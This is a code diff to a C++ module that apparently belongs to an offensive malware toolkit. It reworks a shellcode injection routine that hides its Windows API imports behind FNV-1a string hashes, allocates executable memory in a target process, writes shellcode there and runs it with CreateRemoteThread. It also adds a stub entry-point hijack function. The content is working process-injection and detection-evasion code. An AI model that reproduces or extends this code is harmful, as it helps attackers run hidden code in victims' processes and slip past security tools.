@@ -1,61 +1,51 @@
 #include "execute.hpp"
 
 namespace execute {
-	BOOL CreateRemoteThread(_In_ HANDLE process_handle, _In_ BYTE* shellcode)
+	BOOL CreateRemoteThreadInjection(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
 	{
-		HANDLE process = NULL;
 		PVOID address_ptr = NULL;
 		BOOL success = FALSE;
 		HANDLE thread_handle = NULL;
 		SIZE_T bytes_written = 0;
 		HMODULE kernel32 = NULL;
-		BOOL result = FALSE;
-		DWORD process_id = NULL;
 
 #pragma region [Kernel32 Functions]
+
 		typeGetLastError GetLastErrorC = NULL;
-		typeOpenProcess OpenProcessC = NULL;
+		typeVirtualFreeEx VirtualFreeExC = NULL;
 		typeVirtualAllocEx VirtualAllocExC = NULL;
 		typeWriteProcessMemory WriteProcessMemoryC = NULL;
 		typeCreateRemoteThread CreateRemoteThreadC = NULL;
 		typeCloseHandle CloseHandleC = NULL;
+		typeWaitForSingleObject WaitForSingleObjectC = NULL;
 
-		constexpr ULONG hash_kernel32 = HashString("KERNEL32.DLL");
-		kernel32 = memory::GetModuleHandleC(hash_kernel32);
+		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
+		constexpr ULONG hash_virtualfreeex = malapi::HashStringFowlerNollVoVariant1a("VirtualFreeEx");
+		constexpr ULONG hash_virtualallocex = malapi::HashStringFowlerNollVoVariant1a("VirtualAllocEx");
+		constexpr ULONG hash_writeprocessmemory = malapi::HashStringFowlerNollVoVariant1a("WriteProcessMemory");
+		constexpr ULONG hash_createremotethread = malapi::HashStringFowlerNollVoVariant1a("CreateRemoteThread");
+		constexpr ULONG hash_closehandle = malapi::HashStringFowlerNollVoVariant1a("CloseHandle");
+		constexpr ULONG hash_waitforsingleobject = malapi::HashStringFowlerNollVoVariant1a("WaitForSingleObject");
+		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+
+		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
 		if (kernel32 == NULL)
 		{
 			LOG_ERROR("GetModuleHandle Failed to import Kernel32");
+			goto CLEANUP;
 		}
 
-		GetLastErrorC = (typeGetLastError)memory::GetProcAddressC(kernel32, HashString("GetLastError"));
-		OpenProcessC = (typeOpenProcess)memory::GetProcAddressC(kernel32, HashString("OpenProcess"));
-		VirtualAllocExC = (typeVirtualAllocEx)memory::GetProcAddressC(kernel32, HashString("VirtualAllocEx"));
-		WriteProcessMemoryC = (typeWriteProcessMemory)memory::GetProcAddressC(kernel32, HashString("WriteProcessMemory"));
-		CreateRemoteThreadC = (typeCreateRemoteThread)memory::GetProcAddressC(kernel32, HashString("CreateRemoteThread"));
-		CloseHandleC = (typeCloseHandle)memory::GetProcAddressC(kernel32, HashString("CloseHandle"));
+		GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
+		VirtualFreeExC = (typeVirtualFreeEx)malapi::GetProcAddressC(kernel32, hash_virtualfreeex);
+		VirtualAllocExC = (typeVirtualAllocEx)malapi::GetProcAddressC(kernel32, hash_virtualallocex);
+		WriteProcessMemoryC = (typeWriteProcessMemory)malapi::GetProcAddressC(kernel32, hash_writeprocessmemory);
+		CreateRemoteThreadC = (typeCreateRemoteThread)malapi::GetProcAddressC(kernel32, hash_createremotethread);
+		WaitForSingleObjectC = (typeWaitForSingleObject)malapi::GetProcAddressC(kernel32, hash_waitforsingleobject);
+		CloseHandleC = (typeCloseHandle)malapi::GetProcAddressC(kernel32, hash_closehandle);
 
 #pragma endregion
 
-		// process_handle = open_process(PROCESS_ALL_ACCESS, FALSE, pid);
-		// if (process == NULL)
-		// {
-		// 	LOG_ERROR("[-] Error during OpenProcess call pid: %lu (Code: %08lX)", process_handle, get_last_error());
-		// 	goto CLEANUP;
-		// }
-
-		address_ptr = VirtualAllocExC(process_handle, NULL, sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
-		if (address_ptr == NULL)
-		{
-			LOG_ERROR("Error during VirtualAllocEx (Code: %08lX)", GetLastErrorC());
-			goto CLEANUP;
-		}
-
-		success = WriteProcessMemoryC(process_handle, address_ptr, shellcode, sizeof(shellcode), &bytes_written);
-		if (!success)
-		{
-			LOG_ERROR("Error during WriteProcessMemory (%llu bytes written)", bytes_written);
-			goto CLEANUP;
-		}
+		address_ptr = malapi::WriteShellcodeMemory(process_handle, shellcode, shellcode_size);
 
 		thread_handle = CreateRemoteThreadC(process_handle, NULL, NULL, (LPTHREAD_START_ROUTINE)address_ptr, NULL, NULL, NULL);
 		if (thread_handle == NULL)
@@ -63,12 +53,45 @@ namespace execute {
 			LOG_ERROR("Error during CreateRemoteThread (Code: %08lX)", GetLastErrorC());
 			goto CLEANUP;
 		}
+		else LOG_SUCCESS("Handle to Thread: 0x%08lX", thread_handle);
+		success = TRUE;
 
-		result = TRUE;
+		WaitForSingleObjectC(thread_handle, WAIT_FAILED);
 
 	CLEANUP:
-		CloseHandleC(process_handle);
-		CloseHandleC(thread_handle);
-		return result;
+		if (process_handle)
+		{
+			VirtualFreeExC(process_handle, (LPVOID)address_ptr, 0, MEM_RELEASE);
+			// CloseHandleC(thread_handle);
+			// CloseHandleC(process_handle);
+		}
+		return success;
+	}
+
+	BOOL HijackEntryPoint(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
+	{
+		BOOL success = FALSE;
+		HMODULE kernel32 = NULL;
+
+		typeCloseHandle CloseHandleC = NULL;
+
+		constexpr ULONG hash_closehandle = malapi::HashStringFowlerNollVoVariant1a("CloseHandle");
+		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");
+
+		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
+		if (kernel32 == NULL)
+		{
+			LOG_ERROR("GetModuleHandle Failed to import Kernel32");
+			goto CLEANUP;
+		}
+
+		CloseHandleC = (typeCloseHandle)malapi::GetProcAddressC(kernel32, hash_closehandle);
+
+		success = TRUE;
+
+	CLEANUP:
+		// CloseHandleC(process_handle);
+		// CloseHandleC(thread_handle);
+		return success;
 	}
 } // End of execute namespace
